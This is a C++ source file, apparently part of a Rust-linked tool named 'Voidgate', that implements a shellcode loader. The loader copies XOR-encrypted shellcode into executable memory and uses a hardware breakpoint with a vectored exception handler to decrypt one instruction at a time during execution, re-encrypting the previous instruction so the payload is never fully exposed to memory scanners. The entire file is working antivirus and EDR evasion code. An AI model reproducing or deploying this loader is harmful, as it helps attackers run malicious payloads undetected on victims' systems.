#include "Voidgate.h"
#include "error.h"
#include "global.h"

DWORD64 payload_base =
    0; // Global var holding the base address of the payload (entrypoint).
DWORD64 payload_lower_bound =
    0; // Global var holding the LOWER BOUND of the payload (used to determine
       // if the exception occurs in our payload).
DWORD64 payload_upper_bound =
    0; // Global var holding the UPPER BOUND of the payload (used to determine
       // if the exception occurs in our payload).
DWORD64 last_decrypted_asm =
    0; // Global var holding the address of the last decrypted ASM instruction.
       // This is used to encrypt back the instruction at the next iteration.

LONG VehDecryptHeapAsm(EXCEPTION_POINTERS *ExceptionInfo) {
  if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
    // If hardware breakpoint Dr0 is set, clear it
    if (ExceptionInfo->ContextRecord->Dr0) {
      ExceptionInfo->ContextRecord->Dr0 = 0;
    }

    // Set TRAP flag to generate next EXCEPTION_SINGLE_STEP
    ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

    // If shellcode is not in our bound, continue without encryption/decryption
    // (example: if our shellcode executes a function in kernel32.dll)
    if (ExceptionInfo->ContextRecord->Rip < payload_lower_bound ||
        ExceptionInfo->ContextRecord->Rip > payload_upper_bound) {
      return EXCEPTION_CONTINUE_EXECUTION;
    }

    DWORD64 current_asm_addr = ExceptionInfo->ContextRecord->Rip;

    // If there was a previous decrypted ASM instruction,encrypt it back
    if (last_decrypted_asm) {
      DWORD key_index =
          GetXorKeyIndexForAsm(payload_base, last_decrypted_asm, g_key);

      PBYTE addr_last_decrypted_asm = (PBYTE)last_decrypted_asm;
      for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++) {
        if (key_index == g_key->size()) {
          key_index = 0;
        }
        addr_last_decrypted_asm[i] =
            addr_last_decrypted_asm[i] ^ (*g_key)[key_index];
        key_index++;
      }
    }

    // Decrypt the current ASM instruction to prepare it for execution
    PBYTE current_asm = (PBYTE)current_asm_addr;
    DWORD keyIndex =
        GetXorKeyIndexForAsm(payload_base, current_asm_addr, g_key);
    for (INT i = 0; i < MAX_X64_ASM_OPCODE_LEN; i++) {
      if (keyIndex == g_key->size()) {
        keyIndex = 0;
      }
      current_asm[i] = current_asm[i] ^ (*g_key)[keyIndex];
      keyIndex++;
    }

    // Save the last decrypted ASM address to encrypt it at the next iteration
    last_decrypted_asm = current_asm_addr;
    return EXCEPTION_CONTINUE_EXECUTION;
  } else {
    return EXCEPTION_CONTINUE_SEARCH;
  }
}

BOOL SetHardwareBreakpoint(PVOID address_of_breakpoint) {
  CONTEXT ctx = {0};
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

  HANDLE currentThread = GetCurrentThread();
  DWORD status = GetThreadContext(currentThread, &ctx);

  ctx.Dr0 = (UINT64)address_of_breakpoint;
  ctx.Dr7 |= (1 << 0); // GLOBAL BREAKPOINT
  ctx.Dr7 &= ~(1 << 16);
  ctx.Dr7 &= ~(1 << 17);
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

  if (!SetThreadContext(currentThread, &ctx)) {
    return false;
  }

  return true;
}

DWORD GetXorKeyIndexForAsm(DWORD64 shellcode_base, DWORD64 current_asm_addr,
                           std::string *key) {
  DWORD keySize = key->size();
  DWORD64 difference = current_asm_addr - shellcode_base;
  DWORD characterOffset = difference % (keySize);
  return characterOffset;
}

std::string *g_key = nullptr;
volatile LONG g_voidgate_lock = 0;

void voidgate(rust::Vec<rust::u8> shellcode, rust::u32 ep_offset,
              rust::String key) {
  LONG lock = InterlockedExchange(&g_voidgate_lock, 1);

  if (lock == 0) {
    g_key = new std::string(key.c_str(), key.size());

    // Calculate the memory_size adding PADDING at the begining and at the end
    DWORD memory_size =
        SHELLCODE_PADDING + shellcode.size() + SHELLCODE_PADDING;

    // Allocate memory for the payload
    PVOID heap_memory =
        VirtualAlloc(NULL, memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!heap_memory) {
      delete g_key;
      throw AppError("failed allocating memory");
    }

    // Calculate the memory bounds of our payload and save them to global var
    payload_lower_bound = (DWORD64)heap_memory;
    payload_upper_bound = payload_lower_bound + memory_size;

    // Fill memory with NOP Sled and copy the payload to the heap memory
    memset(heap_memory, '\x90', memory_size);
    PVOID payload_start = (PBYTE)heap_memory + SHELLCODE_PADDING;
    PVOID payload_entry = (PBYTE)payload_start + ep_offset;
    memcpy(payload_start, shellcode.data(), shellcode.size());

    payload_base = (DWORD64)payload_start;

    // Put a HW Breakpoint on our payload entry point
    DWORD status = SetHardwareBreakpoint(payload_entry);

    // Install VEH to handle the payload decryption/encryption after each ASM
    // instruction executed by the payload
    PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
    if (veh) {
      VoidGate vg = (VoidGate)payload_entry;
      vg();
    }

    // Cleanup
    VirtualFree(heap_memory, 0, MEM_RELEASE);
    delete g_key;

    InterlockedExchange(&g_voidgate_lock, 0);
  } else {
    throw AppError("failed acquiring voidgate lock");
  }
}
